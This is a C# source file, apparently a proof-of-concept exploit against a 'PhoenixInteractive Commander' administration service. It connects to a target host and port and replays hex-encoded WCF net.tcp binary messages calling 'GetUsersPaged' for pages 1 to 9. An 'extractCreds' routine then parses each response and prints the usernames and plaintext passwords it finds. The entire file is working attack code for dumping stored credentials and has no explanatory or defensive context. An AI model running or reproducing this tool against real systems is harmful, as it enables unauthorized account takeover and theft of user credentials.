﻿using System;
using System.Net;
using System.Net.Sockets;
using System.Text;


namespace sendToSocket
{
    class Program
    {
        static void Main(string[] args)
        {
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            s.Connect(IPAddress.Parse(args[0]), Int32.Parse(args[1]));

            string hello = "0001000102024e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636503080c";
            string hex1 = "06d302870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad27a17c1ca772b147a5d77ae7f4049c37442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f4005737461727481400a706167654c656e677468990131010101";
            string hex2 = "06d302870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad678d5915fde7f149abab6288d92e34ed442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f4005737461727483400a706167654c656e677468990131010101";
            string hex3 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad927b281260c0304094f8647513813511442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990132400a706167654c656e677468990131010101";
            string hex4 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad25818bea5b02cb4b950e631eb8cad6f6442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990133400a706167654c656e677468990131010101";
            string hex5 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad1d7e8d7b48b75e45abfc1432d5da3577442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990134400a706167654c656e677468990131010101";

            string hex6 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad1d7e8d7b48b75e45abfc1432d5da3577442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990135400a706167654c656e677468990131010101";
            string hex7 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad1d7e8d7b48b75e45abfc1432d5da3577442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990136400a706167654c656e677468990131010101";
            string hex8 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad1d7e8d7b48b75e45abfc1432d5da3577442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990137400a706167654c656e677468990131010101";
            string hex9 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad1d7e8d7b48b75e45abfc1432d5da3577442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990138400a706167654c656e677468990131010101";
            string hex10 = "06d502870137687474703a2f2f74656d707572692e6f72672f4941646d696e697374726174696f6e536572766963652f476574557365727350616765644e6e65742e7463703a2f2f6175323130367374653330313a393030312f50686f656e6978496e7465726163746976652f436f6d6d616e6465722f41646d696e697374726174696f6e5365727669636556020b0173040b0161065608440a1e0082ab01441aad1d7e8d7b48b75e45abfc1432d5da3577442c442aab1401440c1e0082ab0301560e090378736929687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e6365090378736420687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61400d476574557365727350616765640813687474703a2f2f74656d707572692e6f72672f40057374617274990139400a706167654c656e677468990131010101";



            byte[] hellomsg = StringToByteArray(hello);
            byte[] msg = StringToByteArray(hex1);
            SendReceiveTest2(s, hellomsg,false);
            //Console.WriteLine(Encoding.UTF8.GetString(msg));
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex2);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex3);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex4);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex5);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex6);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex7);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex8);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex9);
            SendReceiveTest2(s, msg, true);
            msg = StringToByteArray(hex10);
            SendReceiveTest2(s, msg, true);

            s.Disconnect(true);
            s.Close();




        }

        public static int SendReceiveTest2(Socket server, byte[] msg,bool t)
        {


            byte[] bytes = new Byte[2048];
            try
            {
                // Blocks until send returns.
                int byteCount = server.Send(msg, SocketFlags.None);
                //Console.WriteLine("Sent {0} bytes.", byteCount);

                // Get reply from the server.
                byteCount = server.Receive(bytes, SocketFlags.None);
                if (byteCount > 0)
                {
                    String St = Encoding.UTF8.GetString(bytes);
                    if (t)
                    {
                        extractCreds(St);
                    }

                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("{0} Error code: {1}.", e.Message, e.ErrorCode);
                return (e.ErrorCode);
            }
            return 0;
        }

        public static byte[] StringToByteArray(String hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }
        public static String ParseResponse(byte[] resp)
        {
            String result = "";

            return result;
        }

        public static void extractCreds(String St)
        {
            int pFrom = St.LastIndexOf("UserName") + "UserName".Length;
            int pTo = St.LastIndexOf("Password");
            String username = "";
            string password = "";
            try
            {
                username = St.Substring(pFrom, pTo - pFrom);

            }
            catch { }
            pFrom = St.LastIndexOf("Password") + "Password".Length;
            pTo = St.LastIndexOf("Disabled");
            try
            {
                password = St.Substring(pFrom, pTo - pFrom);

            }
            catch { }
            try
            {
                username = username.Substring(1, username.Length-1);
                password = password.Substring(1, password.Length - 3);
            
            Console.WriteLine("Username: "+username + "  -  Password: " + password);
            }
            catch { }
        }

    }
}


